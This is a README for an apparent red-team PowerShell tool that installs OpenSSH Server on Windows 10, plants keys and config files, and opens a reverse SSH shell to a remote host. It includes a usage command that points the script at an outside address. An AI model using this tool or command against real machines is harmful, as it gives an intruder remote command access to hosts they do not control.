# lol-reverseSSHell
Living Off the LAN Reverse Shell over SSH for Windows 10

This script will install OpenSSH Server on Windows 10 via WindowsCapability. Then it will copy the sshd_config file, SSH private key, and authorized_keys file to the proper locations on the Windows host. Finally it creates a reverse SSH connection. The shell serves CMD.exe by default. Once you're in the cmd cli, you can type 'powershell' to get a PS shell. 

* Please generate NEW SSH KEYs. Use the repo keys only for testing. 

Usage: 
* .\lol-reverseSSHell.ps1 -DestinationUserName `<User>` -DestinationHost 10.10.10.10 -DestinationPort 22 -DestinationBindLocalPort 5555 -InstallOpenSSHServer yes 
* get-help .\lol-reverseSSHell.ps1 

* get-help .\lol-reverseSSHell.ps1 -Examples

![alt text](https://github.com/ArronJablonowski/lol-reverseSSHell/blob/main/image.png?raw=true)

